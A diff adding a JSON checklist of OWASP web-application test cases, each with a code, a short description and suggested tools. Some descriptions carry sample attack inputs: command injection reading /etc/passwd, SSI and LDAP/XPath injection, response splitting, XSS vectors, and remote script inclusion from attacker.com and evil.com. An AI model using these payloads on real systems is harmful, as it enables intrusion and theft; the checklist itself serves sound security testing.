@@ -1,0 +1,751 @@
+[
+  {
+    "code": "OTG-INFO-001",
+    "section": "Information Gathering",
+    "name": "Conduct Search Engine Discovery and Reconnaissance for Information Leakage",
+    "description": "Use a search engine to search for Network diagrams and Configurations, Credentials, Error message content.",
+    "tools": "Google Hacking, Sitedigger, Shodan, FOCA, Punkspider"
+  },
+  {
+    "code": "OTG-INFO-002",
+    "section": "Information Gathering",
+    "name": "Fingerprint Web Server",
+    "description": "Find the version and type of a running web server to determine known vulnerabilities and the appropriate exploits. Using\n\"HTTP header field ordering\" and \"Malformed requests test\".",
+    "tools": "Httprint, Httprecon, Desenmascarame"
+  },
+  {
+    "code": "OTG-INFO-003",
+    "section": "Information Gathering",
+    "name": "Review Webserver Metafiles for Information Leakage",
+    "description": "Analyze robots.txt and identify <META> Tags from website.",
+    "tools": "Browser, curl, wget"
+  },
+  {
+    "code": "OTG-INFO-004",
+    "section": "Information Gathering",
+    "name": "Enumerate Applications on Webserver",
+    "description": "Find applications hosted in the webserver (Virtual hosts/Subdomain), non-standard ports, DNS zone transfers",
+    "tools": "Webhosting.info, dnsrecon, Nmap, fierce, Recon-ng, Intrigue"
+  },
+  {
+    "code": "OTG-INFO-005",
+    "section": "Information Gathering",
+    "name": "Review Webpage Comments and Metadata for Information Leakage",
+    "description": "Find sensitive information from webpage comments and Metadata on source code.",
+    "tools": "Browser, curl, wget"
+  },
+  {
+    "code": "OTG-INFO-006",
+    "section": "Information Gathering",
+    "name": "Identify application entry points",
+    "description": "Identify from hidden fields, parameters, methods HTTP header analysis",
+    "tools": "Burp proxy, ZAP, Tamper data"
+  },
+  {
+    "code": "OTG-INFO-007",
+    "section": "Information Gathering",
+    "name": "Map execution paths through application",
+    "description": "Map the target application and understand the principal workflows.",
+    "tools": "Burp proxy, ZAP"
+  },
+  {
+    "code": "OTG-INFO-008",
+    "section": "Information Gathering",
+    "name": "Fingerprint Web Application Framework",
+    "description": "Find the type of web application framework/CMS from HTTP headers, Cookies, Source code, Specific files and folders.",
+    "tools": "Whatweb, BlindElephant, Wappalyzer"
+  },
+  {
+    "code": "OTG-INFO-009",
+    "section": "Information Gathering",
+    "name": "Map Application Architecture",
+    "description": "Identify application architecture including Web language, WAF, Reverse proxy, Application Server, Backend Database",
+    "tools": "Browser, curl, wget"
+  },
+  {
+    "code": "OTG-CONFIG-001",
+    "section": "Configuration and Deploy Management Testing",
+    "name": "Test Network/Infrastructure Configuration",
+    "description": "Understand the infrastructure elements interactions, config management for software, backend DB server, WebDAV, FTP in order to identify known vulnerabilities.",
+    "tools": "Nessus"
+  },
+  {
+    "code": "OTG-CONFIG-002",
+    "section": "Configuration and Deploy Management Testing",
+    "name": "Test Application Platform Configuration",
+    "description": "Identify default installation file/directory, Handle Server errors (40*,50*), Minimal Privilege, Software logging.",
+    "tools": "Browser, Nikto"
+  },
+  {
+    "code": "OTG-CONFIG-003",
+    "section": "Configuration and Deploy Management Testing",
+    "name": "Test File Extensions Handling for Sensitive Information",
+    "description": "Find important file, information (.asa , .inc , .sql ,zip, tar, pdf, txt, etc)",
+    "tools": "Browser, Nikto"
+  },
+  {
+    "code": "OTG-CONFIG-004",
+    "section": "Configuration and Deploy Management Testing",
+    "name": "Backup and Unreferenced Files for Sensitive Information",
+    "description": "Check JS source code, comments, cache file, backup file (.old, .bak, .inc, .src) and guessing of filename",
+    "tools": "Nessus, Nikto, Wikto"
+  },
+  {
+    "code": "OTG-CONFIG-005",
+    "section": "Configuration and Deploy Management Testing",
+    "name": "Enumerate Infrastructure and Application Admin Interfaces",
+    "description": "Directory and file enumeration, comments and links in source (/admin, /administrator, /backoffice, /backend, etc), alternative server port (Tomcat/8080)",
+    "tools": "Burp Proxy, dirb, Dirbuster, fuzzdb, Tilde Scanner"
+  },
+  {
+    "code": "OTG-CONFIG-006",
+    "section": "Configuration and Deploy Management Testing",
+    "name": "Test HTTP Methods",
+    "description": "Identify HTTP allowed methods on Web server with OPTIONS. Arbitrary HTTP Methods, HEAD access control bypass and XST",
+    "tools": "netcat, curl"
+  },
+  {
+    "code": "OTG-CONFIG-007",
+    "section": "Configuration and Deploy Management Testing",
+    "name": "Test HTTP Strict Transport Security",
+    "description": "Identify HSTS header on Web server through HTTP response header. \ncurl -s -D- https://domain.com/ | grep Strict",
+    "tools": "hstspreload.org"
+  },
+  {
+    "code": "OTG-CONFIG-008",
+    "section": "Configuration and Deploy Management Testing",
+    "name": "Test RIA cross domain policy",
+    "description": "Review and validate the policy files.",
+    "tools": "Burp Proxy, ZAP, W3af"
+  },
+  {
+    "code": "OTG-CONFIG-009",
+    "section": "Configuration and Deploy Management Testing",
+    "name": "Test File Permission",
+    "description": "Review and identify any rogue file permissions.",
+    "tools": "AccessEnum, namei"
+  },
+  {
+    "code": "OTG-CONFIG-010",
+    "section": "Configuration and Deploy Management Testing",
+    "name": "Test for Subdomain Takeover",
+    "description": "Enumerate all possible domains (previous and current). Identify forgotten or misconfigured domains.",
+    "tools": "dig, recon-ng, theHarvester, Sublist3r, dnsrecon"
+  },
+  {
+    "code": "OTG-CONFIG-011",
+    "section": "Configuration and Deploy Management Testing",
+    "name": "Test Cloud Storage",
+    "description": "Assess that the access control configuration for the storage services is properly in place.",
+    "tools": "AWS CLI, curl"
+  },
+  {
+    "code": "OTG-IDENT-001",
+    "section": "Identity Management Testing",
+    "name": "Test Role Definitions",
+    "description": "Validate the system roles defined within the application by creating permission matrix.",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-IDENT-002",
+    "section": "Identity Management Testing",
+    "name": "Test User Registration Process",
+    "description": "Verify that the identity requirements for user registration are aligned\nwith business and security requirements:",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-IDENT-003",
+    "section": "Identity Management Testing",
+    "name": "Test Account Provisioning Process",
+    "description": "Determine which roles are able to provision users and what sort of\naccounts they can provision.",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-IDENT-004",
+    "section": "Identity Management Testing",
+    "name": "Testing for Account Enumeration and Guessable User Account",
+    "description": "Generic login error statement check, return codes/parameter values, enumerate all possible valid userids (Login system, Forgot password)",
+    "tools": "Browser, Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-IDENT-005",
+    "section": "Identity Management Testing",
+    "name": "Testing for Weak or unenforced username policy",
+    "description": "User account names are often highly structured (e.g. Joe Bloggs\naccount name is jbloggs and Fred Nurks account name is fnurks)\nand valid account names can easily be guessed.",
+    "tools": "Browser, Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-IDENT-006",
+    "section": "Identity Management Testing",
+    "name": "Test Permissions of Guest/Training Accounts",
+    "description": "Guest and Training accounts are useful ways to acquaint potential users with system functionality prior to them completing the authorisation process required for access.Evaluate consistency between access policy and guest/training account access permissions.",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-IDENT-007",
+    "section": "Identity Management Testing",
+    "name": "Test Account Suspension/Resumption Process",
+    "description": "Verify the identity requirements for user registration align with business/security requirements. Validate the registration process.",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-AUTHN-001",
+    "section": "Authentication Testing",
+    "name": "Testing for Credentials Transported over an Encrypted Channel",
+    "description": "Check referrer whether its HTTP or HTTPs. Sending data through HTTP and HTTPS.",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-AUTHN-002",
+    "section": "Authentication Testing",
+    "name": "Testing for default credentials",
+    "description": "Testing for default credentials of common applications, Testing for default password of new accounts.",
+    "tools": "Burp Proxy, ZAP, Hydra"
+  },
+  {
+    "code": "OTG-AUTHN-003",
+    "section": "Authentication Testing",
+    "name": "Testing for Weak lock out mechanism",
+    "description": "Evaluate the account lockout mechanism’s ability to mitigate\nbrute force password guessing. Evaluate the unlock mechanism’s resistance to unauthorized account unlocking.",
+    "tools": "Browser"
+  },
+  {
+    "code": "OTG-AUTHN-004",
+    "section": "Authentication Testing",
+    "name": "Testing for bypassing authentication schema",
+    "description": "Force browsing (/admin/main.php, /page.asp?authenticated=yes), Parameter Modification, Session ID prediction, SQL Injection",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-AUTHN-005",
+    "section": "Authentication Testing",
+    "name": "Test remember password functionality",
+    "description": "Look for passwords being stored in a cookie. Examine the cookies stored by the application. Verify that the credentials are not stored in clear text, but are hashed. Autocompleted=off?",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-AUTHN-006",
+    "section": "Authentication Testing",
+    "name": "Testing for Browser cache weakness",
+    "description": "Check browser history issue by clicking \"Back\" button after logging out. Check browser cache issue from HTTP response headers (Cache-Control: no-cache)",
+    "tools": "Burp Proxy, ZAP, Firefox add-on CacheViewer2"
+  },
+  {
+    "code": "OTG-AUTHN-007",
+    "section": "Authentication Testing",
+    "name": "Testing for Weak password policy",
+    "description": "Determine the resistance of the application against brute force\npassword guessing using available password dictionaries by evaluating the length, complexity, reuse and aging requirements of\npasswords.",
+    "tools": "Burp Proxy, ZAP, Hydra"
+  },
+  {
+    "code": "OTG-AUTHN-008",
+    "section": "Authentication Testing",
+    "name": "Testing for Weak security question/answer",
+    "description": "Testing for weak pre-generated questions, Testing for weak self-generated question, Testing for brute-forcible answers (Unlimited attempts?)",
+    "tools": "Browser"
+  },
+  {
+    "code": "OTG-AUTHN-009",
+    "section": "Authentication Testing",
+    "name": "Testing for weak password change or reset functionalities",
+    "description": "Test password reset (Display old password in plain-text?, Send via email?, Random token on confirmation email ?), Test password change (Need old password?), CSRF vulnerability ?",
+    "tools": "Browser, Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-AUTHN-010",
+    "section": "Authentication Testing",
+    "name": "Testing for Weaker authentication in alternative channel",
+    "description": "Understand the primary mechanism and Identify other channels (Mobile App, Call center, SSO)",
+    "tools": "Browser"
+  },
+  {
+    "code": "OTG-AUTHZ-001",
+    "section": "Authorization Testing",
+    "name": "Testing Directory traversal/file include",
+    "description": "dot-dot-slash attack (../), Directory traversal, Local File inclusion/Remote File Inclusion.",
+    "tools": "Burp Proxy, ZAP, Wfuzz"
+  },
+  {
+    "code": "OTG-AUTHZ-002",
+    "section": "Authorization Testing",
+    "name": "Testing for bypassing authorization schema",
+    "description": "Access a resource without authentication?, Bypass ACL, Force browsing (/admin/adduser.jsp)",
+    "tools": "Burp Proxy (Autorize), ZAP"
+  },
+  {
+    "code": "OTG-AUTHZ-003",
+    "section": "Authorization Testing",
+    "name": "Testing for Privilege Escalation",
+    "description": "Testing for role/privilege manipulate the values of hidden variables. Change some param groupid=2 to groupid=1",
+    "tools": "Burp Proxy (Autorize), ZAP"
+  },
+  {
+    "code": "OTG-AUTHZ-004",
+    "section": "Authorization Testing",
+    "name": "Testing for Insecure Direct Object References",
+    "description": "Force changing parameter value (?invoice=123 -> ?invoice=456)",
+    "tools": "Burp Proxy (Autorize), ZAP"
+  },
+  {
+    "code": "OTG-SESS-001",
+    "section": "Session Management Testing",
+    "name": "Testing for Bypassing Session Management Schema",
+    "description": "SessionID analysis prediction, unencrypted cookie transport, brute-force.",
+    "tools": "Burp Proxy, ForceSSL, ZAP, CookieDigger"
+  },
+  {
+    "code": "OTG-SESS-002",
+    "section": "Session Management Testing",
+    "name": "Testing for Cookies attributes",
+    "description": "Check HTTPOnly and Secure flag, expiration, inspect for sensitive data.",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-SESS-003",
+    "section": "Session Management Testing",
+    "name": "Testing for Session Fixation",
+    "description": "The application doesn't renew the cookie after a successfully user authentication.",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-SESS-004",
+    "section": "Session Management Testing",
+    "name": "Testing for Exposed Session Variables",
+    "description": "Encryption & Reuse of session Tokens vulnerabilities, Send sessionID with GET method ?",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-SESS-005",
+    "section": "Session Management Testing",
+    "name": "Testing for Cross Site Request Forgery",
+    "description": "URL analysis, Direct access to functions without any token.",
+    "tools": "Burp Proxy (csrf_token_detect), burpy, ZAP"
+  },
+  {
+    "code": "OTG-SESS-006",
+    "section": "Session Management Testing",
+    "name": "Testing for logout functionality",
+    "description": "Check reuse session after logout both server-side and SSO.",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-SESS-007",
+    "section": "Session Management Testing",
+    "name": "Test Session Timeout",
+    "description": "Check session timeout, after the timeout has passed, all session tokens should be destroyed or be unusable.",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-SESS-008",
+    "section": "Session Management Testing",
+    "name": "Testing for Session puzzling",
+    "description": "The application uses the same session variable for more than one purpose. An attacker can potentially access pages in an order unanticipated by the developers so that the session variable is set in one context and then used in another.",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-SESS-009",
+    "section": "Session Management Testing",
+    "name": "Testing for Session Hijacking",
+    "description": "Identify vulnerable session cookies. Hijack vulnerable cookies and assess the risk level.",
+    "tools": "Burp Proxy, ZAP, JHijack"
+  },
+  {
+    "code": "OTG-INPVAL-001",
+    "section": "Data Validation Testing",
+    "name": "Testing for Reflected Cross Site Scripting",
+    "description": "Check for input validation, Replace the vector used to identify XSS, XSS with HTTP Parameter Pollution.",
+    "tools": "Burp Proxy, ZAP, Xenotix XSS"
+  },
+  {
+    "code": "OTG-INPVAL-002",
+    "section": "Data Validation Testing",
+    "name": "Testing for Stored Cross Site Scripting",
+    "description": "Check input forms/Upload forms and analyze HTML codes, Leverage XSS with BeEF",
+    "tools": "Burp Proxy, ZAP, BeEF, XSS Proxy"
+  },
+  {
+    "code": "OTG-INPVAL-003",
+    "section": "Data Validation Testing",
+    "name": "Testing for HTTP Verb Tampering",
+    "description": "Craft custom HTTP requests to test the other methods to bypass URL authentication and authorization.",
+    "tools": "netcat"
+  },
+  {
+    "code": "OTG-INPVAL-004",
+    "section": "Data Validation Testing",
+    "name": "Testing for HTTP Parameter pollution",
+    "description": "Identify any form or action that allows user-supplied input to bypass Input validation and filters using HPP",
+    "tools": "ZAP, HPP Finder (Chrome Plugin)"
+  },
+  {
+    "code": "OTG-INPVAL-005",
+    "section": "Data Validation Testing",
+    "name": "Testing for SQL Injection",
+    "description": "Union, Boolean, Error based, Out-of-band, Time delay.",
+    "tools": "Burp Proxy (SQLipy), SQLMap, Pangolin, Seclists (FuzzDB)"
+  },
+  {
+    "code": "OTG-INPVAL-005-01",
+    "section": "Data Validation Testing",
+    "name": "Oracle Testing",
+    "description": "Identify URLs for PL/SQL web applications, Access with PL/SQL Packages, Bypass PL/SQL Exclusion list, SQL Injection",
+    "tools": "Orascan, SQLInjector"
+  },
+  {
+    "code": "OTG-INPVAL-005-02",
+    "section": "Data Validation Testing",
+    "name": "MySQL Testing",
+    "description": "Identify MySQL version, Single quote, Information_schema, Read/Write file.",
+    "tools": "SQLMap, Mysqloit, Power Injector"
+  },
+  {
+    "code": "OTG-INPVAL-005-03",
+    "section": "Data Validation Testing",
+    "name": "SQL Server Testing",
+    "description": "Comment operator (- -), Query separator (;), Stored procedures (xp_cmdshell)",
+    "tools": "SQLMap, SQLninja, Power Injector"
+  },
+  {
+    "code": "OTG-INPVAL-005-04",
+    "section": "Data Validation Testing",
+    "name": "Testing PostgreSQL",
+    "description": "Determine that the backend database engine is PostgreSQL by using the :: cast operator. Read/Write file, Shell Injection (OS command)",
+    "tools": "SQLMap"
+  },
+  {
+    "code": "OTG-INPVAL-005-05",
+    "section": "Data Validation Testing",
+    "name": "MS Access Testing",
+    "description": "Enumerate the column through error-based (Group by), Obtain database schema combine with fuzzdb.",
+    "tools": "SQLMap"
+  },
+  {
+    "code": "OTG-INPVAL-005-06",
+    "section": "Data Validation Testing",
+    "name": "Testing for NoSQL injection",
+    "description": "Identify NoSQL databases, Pass special characters (' \" \\ ; { } ), Attack with reserved variable name, operator.",
+    "tools": "NoSQLMap"
+  },
+  {
+    "code": "OTG-INPVAL-005-07",
+    "section": "Data Validation Testing",
+    "name": "Testing for ORM Injection",
+    "description": "Testing ORM injection is identical to SQL injection testing",
+    "tools": "Hibernate, Nhibernate"
+  },
+  {
+    "code": "OTG-INPVAL-005-08",
+    "section": "Data Validation Testing",
+    "name": "Testing for Client-side",
+    "description": "The following test scenario will validate that proper input validation is conducted. If the implementation is vulnerable, the attacker can read, modify, or delete information stored within the database.",
+    "tools": "Web SQL DB"
+  },
+  {
+    "code": "OTG-INPVAL-006",
+    "section": "Data Validation Testing",
+    "name": "Testing for LDAP Injection",
+    "description": "/ldapsearch?user=*\nuser=*user=*)(uid=*))(|(uid=*\npass=password",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-INPVAL-007",
+    "section": "Data Validation Testing",
+    "name": "Testing for XML Injection",
+    "description": "Check with XML Meta Characters\n', \" , <>, <!--/-->, &, <![CDATA[ / ]]>, XXE, TAG",
+    "tools": "Burp Proxy, ZAP, Wfuzz"
+  },
+  {
+    "code": "OTG-INPVAL-008",
+    "section": "Data Validation Testing",
+    "name": "Testing for SSI Injection",
+    "description": "• Presense of .shtml extension\n• Check for these characters\n< ! # = / . \" - > and [a-zA-Z0-9]\n• include String = <!--#include virtual=\"/etc/passwd\" -->",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-INPVAL-009",
+    "section": "Data Validation Testing",
+    "name": "Testing for XPath Injection",
+    "description": "Check for XML error enumeration by supplying a single quote (')\nUsername: ‘ or ‘1’ = ‘1\nPassword: ‘ or ‘1’ = ‘1",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-INPVAL-010",
+    "section": "Data Validation Testing",
+    "name": "IMAP/SMTP Injection",
+    "description": "• Identifying vulnerable parameters with special characters\n(i.e.: \\, ‘, “, @, #, !, |)\n• Understanding the data flow and deployment structure of the client\n• IMAP/SMTP command injection (Header, Body, Footer)",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-INPVAL-011",
+    "section": "Data Validation Testing",
+    "name": "Testing for Code Injection",
+    "description": "Enter OS commands in the input field.\n?arg=1; system('id')",
+    "tools": "Burp Proxy, ZAP, Liffy, Panoptic"
+  },
+  {
+    "code": "OTG-INPVAL-011-01",
+    "section": "Data Validation Testing",
+    "name": "Testing for Local File Inclusion",
+    "description": "LFI with dot-dot-slash (../../), PHP Wrapper (php://filter/convert.base64-encode/resource)",
+    "tools": "Burp Proxy, fimap, Liffy"
+  },
+  {
+    "code": "OTG-INPVAL-011-02",
+    "section": "Data Validation Testing",
+    "name": "Testing for Remote File Inclusion",
+    "description": "RFI from malicious URL\n?page.php?file=http://attacker.com/malicious_page",
+    "tools": "Burp Proxy, fimap, Liffy"
+  },
+  {
+    "code": "OTG-INPVAL-012",
+    "section": "Data Validation Testing",
+    "name": "Testing for Command Injection",
+    "description": "Understand the application platform, OS, folder structure, relative path and execute OS commands on a Web server.\n%3Bcat%20/etc/passwd\ntest.pdf+|+Dir C:\\",
+    "tools": "Burp Proxy, ZAP, Commix"
+  },
+  {
+    "code": "OTG-INPVAL-013",
+    "section": "Data Validation Testing",
+    "name": "Testing for Format String Injection",
+    "description": "Assess whether injecting format string conversion specifiers into user-controlled fields causes undesired behaviour from the application.",
+    "tools": "Immunity Canvas, Spike, MSF, Nessus"
+  },
+  {
+    "code": "OTG-INPVAL-014",
+    "section": "Data Validation Testing",
+    "name": "Testing for incubated vulnerabilities",
+    "description": "File Upload, Stored XSS , SQL/XPATH Injection, Misconfigured servers (Tomcat, Plesk, Cpanel)",
+    "tools": "Burp Proxy, BeEF, MSF"
+  },
+  {
+    "code": "OTG-INPVAL-015",
+    "section": "Data Validation Testing",
+    "name": "Testing for HTTP Splitting/Smuggling",
+    "description": "param=foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>",
+    "tools": "Burp Proxy, ZAP, netcat"
+  },
+  {
+    "code": "OTG-INPVAL-016",
+    "section": "Data Validation Testing",
+    "name": "Testing for HTTP Incoming Requests",
+    "description": "Monitor all incoming and outgoing HTTP requests to the Web Server to inspect any suspicious requests. Monitor HTTP traffic without changes of end user Browser proxy or client-side application.",
+    "tools": "Fiddler, TCPProxy, Charles Web Debugging Proxy, WireShark, PowerEdit-Pcap, pcapteller ,replayproxy, Ostinato"
+  },
+  {
+    "code": "OTG-INPVAL-017",
+    "section": "Data Validation Testing",
+    "name": "Testing for Host Header Injection",
+    "description": "Assess if the Host header is being parsed dynamically in the application. Bypass security controls that rely on the header.",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-INPVAL-018",
+    "section": "Data Validation Testing",
+    "name": "Testing for Server-side Template Injection",
+    "description": "SSTI vulnerabilities exist either in text or code context. In plaintext context users allowed to use freeform ‘text’ with direct HTML code. In code context the user input may also be placed within a template statement (eg. in a variable name)",
+    "tools": "Tplmap, Backslash Powered Scanner Burp Suite extension, Template expression test strings/payloads list"
+  },
+  {
+    "code": "OTG-INPVAL-019",
+    "section": "Data Validation Testing",
+    "name": "Testing for Server-Side Request Forgery",
+    "description": "When testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious. The most common test is for local and remote file inclusion. There is also another facet to SSRF: a trust relationship that often arises where the application server is able to interact with other back-end systems that are not directly reachable by users",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-ERR-001",
+    "section": "Error Handling",
+    "name": "Testing for Improper Error Handling",
+    "description": "Locate error codes generated from applications or web servers. Collect sensitive information from that errors (Web Server, Application Server, Database)",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-ERR-002",
+    "section": "Error Handling",
+    "name": "Analysis of Stack Traces",
+    "description": "• Invalid Input / Empty inputs\n• Input that contains non alphanumeric characters or query syn\ntax\n• Access to internal pages without authentication\n• Bypassing application flow",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-CRYPST-001",
+    "section": "Cryptography",
+    "name": "Testing for Weak SSL/TSL Ciphers, Insufficient Transport Layer Protection",
+    "description": "Identify SSL service, Idectify weak ciphers/protocols (ie. RC4, BEAST, CRIME, POODLE)",
+    "tools": "testssl.sh, SSL Breacher"
+  },
+  {
+    "code": "OTG-CRYPST-002",
+    "section": "Cryptography",
+    "name": "Testing for Padding Oracle",
+    "description": "Compare the responses in three different states:\n• Cipher text gets decrypted, resulting data is correct.\n• Cipher text gets decrypted, resulting data is garbled and causes\nsome exception or error handling in the application logic.\n• Cipher text decryption fails due to padding errors.",
+    "tools": "PadBuster, Poracle, python-paddingoracle, POET"
+  },
+  {
+    "code": "OTG-CRYPST-003",
+    "section": "Cryptography",
+    "name": "Testing for Sensitive information sent via unencrypted channels",
+    "description": "Check sensitive data during the transmission:\n• Information used in authentication (e.g. Credentials, PINs, Session\nidentifiers, Tokens, Cookies…)\n• Information protected by laws, regulations or specific organizational\npolicy (e.g. Credit Cards, Customers data)",
+    "tools": "Burp Proxy, ZAP, Curl"
+  },
+  {
+    "code": "OTG-CRYPST-004",
+    "section": "Cryptography",
+    "name": "Testing for Weak Encryption",
+    "description": "Incorrect uses of encryption algorithms may result in sensitive data exposure, key leakage, broken authentication, insecure session, and spoofing attacks. There are some encryption or hash algorithms known to be weak and are not suggested for use such as MD5 and RC4.",
+    "tools": "Nessus, nmap, OpenVAS"
+  },
+  {
+    "code": "OTG-BUSLOGIC-001",
+    "section": "Business logic Testing",
+    "name": "Test Business Logic Data Validation",
+    "description": "• Looking for data entry points or hand off points between systems or software.\n• Once found try to insert logically invalid data into the application/system.",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-BUSLOGIC-002",
+    "section": "Business logic Testing",
+    "name": "Test Ability to Forge Requests",
+    "description": "• Looking for guessable, predictable or hidden functionality of fields.\n• Once found try to insert logically valid data into the application/system allowing the user go through the application/system against the normal busineess logic workflow.",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-BUSLOGIC-003",
+    "section": "Business logic Testing",
+    "name": "Test Integrity Checks",
+    "description": "•Looking for parts of the application/system (components i.e. For example, input fields, databases or logs) that move, store or handle data/information.\n• For each identified component determine what type of data/information is logically acceptable and what types the application/system should guard against. Also, consider who according to the business logic is allowed to insert, update and delete data/information and in each component.\n• Attempt to insert, update or edit delete the data/information values with invalid data/information into each component (i.e. input, database, or log) by users that .should not be allowed per the busines logic workflow.",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-BUSLOGIC-004",
+    "section": "Business logic Testing",
+    "name": "Test for Process Timing",
+    "description": "• Looking for application/system functionality that may\nbe impacted by time. Such as execution time or actions that\nhelp users predict a future outcome or allow one to circumvent\nany part of the business logic or workflow. For example, not\ncompleting transactions in an expected time.\n• Develop and execute the mis-use cases ensuring that attackers\ncan not gain an advantage based on any timing.",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-BUSLOGIC-005",
+    "section": "Business logic Testing",
+    "name": "Test Number of Times a Function Can be Used Limits",
+    "description": "• Looking for functions or features in the application or system that should not be executed more that a single time or specified number of times during the business logic workflow.\n• For each of the functions and features found that should only be executed a single time or specified number of times during the business logic workflow, develop abuse/misuse cases that may allow a user to execute more than the allowable number of times.",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-BUSLOGIC-006",
+    "section": "Business logic Testing",
+    "name": "Testing for the Circumvention of Work Flows",
+    "description": "• Looking for methods to skip or go to steps in the application process in a different order from the designed/intended business logic flow.\n• For each method develop a misuse case and try to circumvent or perform an action that is \"not acceptable\" per the the business logic workflow.",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-BUSLOGIC-007",
+    "section": "Business logic Testing",
+    "name": "Test Defenses Against Application Mis-use",
+    "description": "Measures that might indicate the application has in-built self-defense:\n• Changed responses\n• Blocked requests\n• Actions that log a user out or lock their account",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-BUSLOGIC-008",
+    "section": "Business logic Testing",
+    "name": "Test Upload of Unexpected File Types",
+    "description": "• Review the project documentation and perform some exploratory testing looking for file types that should be \"unsupported\" by the application/system.\n• Try to upload these “unsupported” files an verify that it are properly rejected.\n• If multiple files can be uploaded at once, there must be tests in place to verify that each file is properly evaluated. \nPS. file.phtml, shell.phPWND, SHELL~1.PHP",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-BUSLOGIC-009",
+    "section": "Business logic Testing",
+    "name": "Test Upload of Malicious Files",
+    "description": "• Develop or acquire a known “malicious” file.\n• Try to upload the malicious file to the application/system and verify that it is correctly rejected.\n• If multiple files can be uploaded at once, there must be tests in place to verify that each file is properly evaluated.",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-CLIENT-001",
+    "section": "Client Side Testing",
+    "name": "Testing for DOM based Cross Site Scripting",
+    "description": "Test for the user inputs obtained from client-side JavaScript Objects",
+    "tools": "Burp Proxy, DOMinator"
+  },
+  {
+    "code": "OTG-CLIENT-002",
+    "section": "Client Side Testing",
+    "name": "Testing for JavaScript Execution",
+    "description": "Inject JavaScript code:\nwww.victim.com/?javascript:alert(1)",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-CLIENT-003",
+    "section": "Client Side Testing",
+    "name": "Testing for HTML Injection",
+    "description": "Send malicious HTML code:\n?user=<img%20src='aaa'%20onerror=alert(1)>",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-CLIENT-004",
+    "section": "Client Side Testing",
+    "name": "Testing for Client Side URL Redirect",
+    "description": "Modify untrusted URL input to a malicious site: (Open Redirect)\n?redirect=www.fake-target.site",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-CLIENT-005",
+    "section": "Client Side Testing",
+    "name": "Testing for CSS Injection",
+    "description": "Inject code in the CSS context :\n•  www.victim.com/#red;-o-link:'javascript:alert(1)';-o-link-source:current; (Opera [8,12])\n•  www.victim.com/#red;-:expression(alert(URL=1)); (IE 7/8)",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-CLIENT-006",
+    "section": "Client Side Testing",
+    "name": "Testing for Client Side Resource Manipulation",
+    "description": "External JavaScript could be easily injected in the trusted web site\nwww.victim.com/#http://evil.com/js.js",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-CLIENT-007",
+    "section": "Client Side Testing",
+    "name": "Test Cross Origin Resource Sharing",
+    "description": "Check the HTTP headers in order to understand how CORS is\nused (Origin Header)",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-CLIENT-008",
+    "section": "Client Side Testing",
+    "name": "Testing for Cross Site Flashing",
+    "description": "Decompile, Undefined variables, Unsafe methods, Include malicious SWF (http://victim/file.swf?lang=http://evil",
+    "tools": "FlashBang, Flare, Flasm, SWFScan, SWF Intruder"
+  },
+  {
+    "code": "OTG-CLIENT-009",
+    "section": "Client Side Testing",
+    "name": "Testing for Clickjacking",
+    "description": "Discover if a website is vulnerable by loading into an iframe, create simple web page that includes a frame containing the target.",
+    "tools": "Burp Proxy, ClickjackingTool"
+  },
+  {
+    "code": "OTG-CLIENT-010",
+    "section": "Client Side Testing",
+    "name": "Testing WebSockets",
+    "description": "Identify that the application is using WebSockets by inspecting ws:// or wss:// URI scheme.Use Google Chrome's Developer Tools to view the Network WebSocket communication. Check Origin, Confidentiality and Integrity, Authentication, Authorization, Input Sanitization",
